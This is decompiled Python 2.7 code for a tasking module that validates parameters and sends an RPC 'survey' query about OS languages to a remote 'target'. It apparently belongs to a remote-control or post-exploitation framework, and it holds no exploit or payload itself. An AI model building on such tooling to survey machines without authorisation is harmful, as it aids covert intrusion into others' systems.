# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Language_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.language', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.language.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.language.Params()
    if lpParams['path'] != None:
        tgtParams.path = lpParams['path']
    if lpParams['file'] != None and len(lpParams['file']) > 0:
        tgtParams.file = lpParams['file']
    else:
        mcl.tasking.EchoError('No file was specified')
        return False
    if lpParams['numLang'] <= 0:
        mcl.tasking.EchoError('Number of OS Languages must be greater than 0')
        return False
    else:
        tgtParams.numLang = lpParams['numLang']
        rpc = mca.survey.cmd.language.tasking.RPC_INFO_QUERY
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.language.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)